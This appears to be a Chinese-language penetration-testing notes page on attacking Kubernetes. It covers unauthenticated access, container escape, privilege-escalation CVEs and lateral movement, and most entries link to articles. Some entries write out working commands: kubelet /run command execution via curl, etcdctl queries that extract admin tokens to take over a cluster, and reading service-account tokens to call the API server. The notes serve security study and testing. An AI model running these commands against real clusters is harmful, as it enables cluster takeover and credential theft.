# Kubernetes

kubernetes，简称 K8s,是 Google 开源的一个容器编排引擎，它支持自动化部署、大规模可伸缩、应用容器化管理。在生产环境中部署一个应用程序时，通常要部署该应用的多个实例以便对应用请求进行负载均衡。

> 官网 : https://kubernetes.io/

> Fofa : app="kubernetes"

**相关文章**
- [K8s安全入门学习扫盲贴](https://tttang.com/archive/1465/)
- [云安全 | k8s 所面临的风险学习](https://mp.weixin.qq.com/s/UAtvPnduvZ_tcmdn_RupCg)
- [3种攻击手段教你拿下k8s集群](https://mp.weixin.qq.com/s/KBuU0JLgr20wAenzGAHjlQ)
- [K8s 安全策略最佳实践](https://mp.weixin.qq.com/s/ZDqchROixZT4enVYH6UIfw)

**相关案例**
- [Cloudflare Pages, part 3: The return of the secrets](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt3/)

---

## 未授权

**Kubernetes Api Server 未授权访问**
- 漏洞描述

    Kubernetes API Server 可以在两个端口上提供了对外服务：8080（insecure-port，非安全端口）和 6443（secure-port，安全端口），其中 8080 端口提供 HTTP 服务且无需身份认证，6443 端口提供 HTTPS 服务且支持身份认证 (8080 和 6443 端口并不是固定的，是通过配置文件来控制的)。

    如果 8080 在外部环境中被暴露出来，攻击者便可以利用此端口进行对集群的攻击, 前提条件略显苛刻（配置失当 + 版本较低），首先 8080 端口服务是默认不启动的，但如果用户在 `/etc/kubernets/manifests/kube-apiserver.yaml` 中有 --insecure-port=8080 配置项，那就启动了非安全端口，有了安全风险。1.20版本后该选项已无效化.

    若我们不带任何凭证的访问 API server 的 secure-port 端口，默认会被服务器标记为 system:anonymous 用户, 一般 system:anonymous 用户权限是很低的，但是如果运维人员管理失当，将 system:anonymous 用户绑定到了 cluster-admin 用户组，那么就意味着 secure-port 允许匿名用户以管理员权限向集群下达命令。

- 相关文章
    - [Kubernetes Api Server 未授权访问漏洞](https://www.jianshu.com/p/e443b3171253)

**Kubernetes Dashboard 未授权访问**
- 漏洞描述

    Kubernetes Dashboard 是一个通用的，基于 Web 的 Kubernetes 集群用户界面。它允许用户管理集群中运行的应用程序，并对其进行故障排除，以及管理集群本身。在其早期版本中（v1.10.1 之前）存在未授权访问风险，用户在按照官方文档所给方式部署完成后，默认下，需要先执行 kubectl proxy，然后才能通过本地 8001 端口访问 Dashboard。但是，如果直接将 Dashboard 端口映射在宿主机节点上，或者在执行 kubectl proxy 时指定了额外地址参数，如：
    ```bash
    kubectl proxy --address 0.0.0.0 --accept-hosts='^*$'
    ```
    那么所有能够访问到宿主机的用户，包括攻击者，都将能够直接访问 Dashboard。

    默认情况下 Dashboard 需要登录认证，但是，如果用户在 Dashboard 的启动参数中添加了 `--enable-skip-login` 选项，那么攻击者就能够直接点击 Dashboard 界面的 “跳过” 按钮，无需登录便可直接进入 Dashboard。关于如何设置 `--enable-skip-login` ，在 v1.10.1 前，实则是无需配置的，通过在 Kubernetes Dashboard 的 Web 登录界面点击 “跳过” 按钮即可访问，也是因为这个原因，安全意识较为薄弱的用户直接将早期版本以默认的配置方式部署在互联网上使得攻击者无需花费丝毫力气就可以轻易浏览到 Kubernetes 集群的运行状态，因而在 v1.10.1 版本后，开发团队增加了显式配置的功能，需要用户在相应部署的 yaml 文件中指定 `--enable-skip-login` 参数配置才能开启未授权访问。

**kubelet 未授权访问**
- 漏洞描述

    kubelet 是在 Node 上用于管理本机 Pod 的，kubectl 是用于管理集群的。kubectl 向集群下达指令，Node 上的 kubelet 收到指令后以此来管理本机 Pod。

    Kubelet 服务启动后会监听多个端口，用于接收 Kubernetes API Server 组件发送的请求
    - 10248 : Kubelet healthz 的服务端口，用于判断 Kubelet 组件的健康状态，已于 Kubernetes v1.16 版本后弃用，访问该端口默认需要认证授权
    - 10250 : Kubelet 的 HTTPS 服务，读写端口，提供 Kubernetes 基本资源运行状态， 访问该端口默认需要认证授权
    - 10255 : Kubelet 的 HTTP 服务，只读端口，提供只读形式的 Kubernetes 基本资源运行状态，该端口无需进行认证授权，默认为禁用
    - 4194 : cAdvisor 的 HTTP 服务端口，自 Kubernetes v1.10 版本开始，官方去除了 --cadvisor-port 参数配置，不再支持对 cAdvisor 的访问

    kubelet 对应的 API 端口默认在 10250，运行在集群中每台 Node 上，kubelet 的配置文件在 node 上的 `/var/lib/kubelet/config.yaml`

    配置文件中 authentication 选项用于设置 kubelet api 能否被匿名访问，authorization 选项用于设置 kubelet api 访问是否需要经过 Api server 进行授权, 如果把 authentication-anonymous-enabled 改为 true，authorization-mode 改为 AlwaysAllow，再使用命令 systemctl restart kubelet 重启 kubelet，那么就存在 kubelet 未授权访问

- POC | Payload | exp
    ```bash
    # 如果有 kubelet 未授权，可以用以下命令在 Pod 内执行命令

    curl https://node_ip:10250/pods
    curl -XPOST -k https://node_ip:10250/run/<namespace>/<PodName>/<containerName> -d "cmd=command"

    /pods
    /runningpods
    /metrics
    /spec
    /stats
    /stats/container
    /logs
    /run/
    /exec/
    /attach/
    /portForward/
    /containerLogs/
    ```

- kubeconfig 泄露

    ```
    kubectl --kubeconfig=config --insecure-skip-tls-verify=true get pods --all-namespaces -o wide
    ```

**etcd 未授权**
- 漏洞描述

    etcd 是 k8s 集群中的数据库组件，默认监听在 2379 端口. 如果 2379 存在未授权，那么就可以通过 etcd 查询集群内管理员的 token，然后用这个 token 访问 api server 接管集群。

    在启动 etcd 时，如果没有指定 `--client-cert-auth` 参数打开证书校验，并且没有通过iptables/防火墙等实施访问控制，etcd 的接口和数据就会直接暴露给外部黑客 "

    下载 https://github.com/etcd-io/etcd/releases/
    ```bash
    etcdctl --endpoints=https://etcd_ip:2379/ get / --prefix --keys-only
    # 查询管理员 token
    etcdctl --endpoints=https://etcd_ip:2379/ get / --prefix --keys-only | grep /secrets/
    # 在 etcd 里查询管理员的 token，然后使用该 token 配合 kubectl 指令接管集群
    etdctl --endpoints=https://etcd_ip:2379/ get /registry/secrets/default/admin-token-xxxxx
    # 拿到 token 以后，用 kubectl 接管集群
    kubectl --insecure-skip-tls-verify -s https://master_ip:6443/ --token="xxxxxx" get nodes

    # 如果要求证书文件,需要将以下文件加入环境变量才能访问（如果有未授权，那么不用带证书都能访问）
    export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt
    export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt
    export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key
    ```

---

## 中间人攻击

**CVE-2020-8554**
- 漏洞描述

    如果攻击者可以创建或编辑服务和容器，则此安全问题使攻击者能够拦截来自群集中其他容器（或节点）的流量。攻击者可利用该漏洞通过 Kubernetes 上的 LoadBalancer 或 ExternalIP 充当中间人，以便在会话中读取或写入数据。

- 相关文章
    - [CVE-2020-8554 Kubernetes中间人攻击漏洞复现与解析，附演示视频](https://mp.weixin.qq.com/s/nFMK5pLKtR2MDJFGppFypw)

- POC | Payload | exp
    - [tdwyer/CVE-2020-8559](https://github.com/tdwyer/CVE-2020-8559)

---

## 容器逃逸

**目录挂载逃逸**
- 相关文章
    - https://tttang.com/archive/1465/#toc__6

**挂载 /var/log 导致容器逃逸**
- 漏洞描述

    当 pod 以可写权限挂载了宿主机的 `/var/log` 目录，而且 pod 里的 service account 有权限访问该 pod 在宿主机上的日志时，攻击者可以通过在容器内创建符号链接来完成简单逃逸。

- 相关文章
    - [挂载/var/log导致容器逃逸](https://github.com/Metarget/metarget/tree/master/writeups_cnv/mount-var-log)

**滥用CAP_DAC_READ_SEARCH（shocker攻击）导致容器逃逸**
- 漏洞描述

    在早期的 docker 中，容器内是默认拥有 CAP_DAC_READ_SEARCH 的权限的，拥有该 capability 权限之后，容器内进程可以使用 open_by_handle_at 系统调用来爆破宿主机的文件内容。

- 相关文章
    - [滥用CAP_DAC_READ_SEARCH（shocker攻击）导致容器逃逸](https://github.com/Metarget/metarget/tree/master/writeups_cnv/config-cap_dac_read_search-container)
        ```bash
        ./metarget cnv install cap_dac_read_search-container
        kubectl exec -it cap-dac-read-search-container -n metarget bash
        ```

**CVE-2017-1002101**
- 漏洞描述

    Kubernetes 在宿主机文件系统上解析了 Pod 滥用 subPath 机制创建的符号链接，故而宿主机上任意路径（如根目录）能够被挂载到攻击者可控的恶意容器中，导致容器逃逸。

- 相关文章
    - [CVE-2017-1002101：突破隔离访问宿主机文件系统](https://github.com/Metarget/cloud-native-security-book/blob/main/appendix/CVE-2017-1002101%EF%BC%9A%E7%AA%81%E7%A0%B4%E9%9A%94%E7%A6%BB%E8%AE%BF%E9%97%AE%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F.pdf)

**CVE-2021-25741**
- 相关文章
    - [逃逸风云再起：从CVE-2017-1002101到CVE-2021-25741](https://mp.weixin.qq.com/s/RqaWvzXZR6sLPzBI8ljoxg)

**CVE-2021-30465**
- 漏洞描述

    该漏洞是由于挂载卷时，runC 不信任目标参数，并将使用 “filepath-securejoin” 库来解析任何符号链接并确保解析的目标在容器根目录中，但是如果用符号链接替换检查的目标文件时，可以将主机文件挂载到容器中。黑客可利用该漏洞能将宿主机目录挂载到容器中，来实现容器逃逸。

- 相关文章
    - [CVE-2021-30465——runc竞争条件漏洞复现与分析](https://mp.weixin.qq.com/s/WRRjLKk_C9pq2WlvnA-NZQ)
    - [runC漏洞导致容器逃逸（CVE-2021-30465）](https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-runc-cve-2021-30465)

**CVE-2022-0811 容器逃逸漏洞**
- 漏洞描述

    CrowdStrike 的云威胁研究团队在 CRI-O(一个支撑 Kubernetes 的容器运行时引擎) 中发现了一个新的漏洞 (CVE-2022-0811)，被称为 “cr8escape”。攻击者在创建容器时可以从 Kubernetes 容器中逃离，并获得对主机的根访问权，从而可以在集群中的任何地方移动。调用 CVE-2022-0811 可以让攻击者对目标执行各种操作，包括执行恶意软件、数据外溢和跨 pod 的横向移动。

- 影响范围

    CRI-O > 1.19.0

- 相关文章
    - [谁动了我的core_pattern？CVE-2022-0811容器逃逸漏洞分析](https://mp.weixin.qq.com/s/i6KicVePNYyQPwYZIwkS8w)
    - [Kubernetes CRI-O逃逸CVE-2022-0811漏洞复现](https://mp.weixin.qq.com/s/0kc8uJXj7uCId3HR2FAGYA)

---

## 提权

**CVE-2018-1002105**
- 漏洞描述

    Kubernetes 特权升级漏洞（CVE-2018-1002105）由 Rancher Labs 联合创始人及首席架构师 Darren Shepherd 发现。该漏洞通过经过详细分析评估，主要可以实现提升 k8s 普通用户到 k8s api server 的权限（默认就是最高权限），注意点是，普通用户至少需要具有一个 pod 的 exec/attach/portforward 等权限。

- 相关文章
    - [CVE-2018-1002105（k8s特权提升）原理与利用分析报告](https://xz.aliyun.com/t/3542)
    - [云安全 | k8s 提权漏洞 CVE-2018-1002105 学习](https://mp.weixin.qq.com/s/XwfNYEYRClJQswgwScJyyQ)

- POC | Payload | exp
    - [evict/poc_CVE-2018-1002105](https://github.com/evict/poc_CVE-2018-1002105)
    - [gravitational/cve-2018-1002105](https://github.com/gravitational/cve-2018-1002105)

**CVE-2020-8559**
- 漏洞描述

    CVE-2020-8559 是一个针对 Kubernetes 的权限提升漏洞，攻击者可以截取某些发送至节点 kubelet 的升级请求，通过请求中原有的访问凭据转发请求至其他目标节点，从而造成节点的权限提升.

- 相关文章
    - [移花接木：看CVE-2020-8559如何逆袭获取集群权限](https://mp.weixin.qq.com/s/MgTRc7gu0-jwnpzzKsrCiw)

---

## 横向

**利用 Service Account 连接 API Server 执行指令**
- https://tttang.com/archive/1465/#toc_service-accountapi-server

    k8s 有两种账户：用户账户和服务账户，用户账户被用于人与集群交互（如管理员管理集群），服务账户用于 Pod 与集群交互（如 Pod 调用 api server 提供的一些 API 进行一些活动）

    如果我们入侵了一台有着高权限服务账户的 Pod，我们就可以用它对应的服务账户身份调用 api server 向集群下达命令。

    pod 的 serviceaccount 信息一般存放于 `/var/run/secrets/kubernetes.io/serviceaccount/` 目录下
    ```bash
    CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    curl --cacert $CA_CERT -H "Authorization: Bearer $TOKEN" "https://api_server_ip:6443/version/"
    ```

---

## DOS

**相关文章**
- [【云攻防系列】云原生中DOS攻击研究](https://mp.weixin.qq.com/s/3MAb2K8ZTUomUA5eyGGk6w)
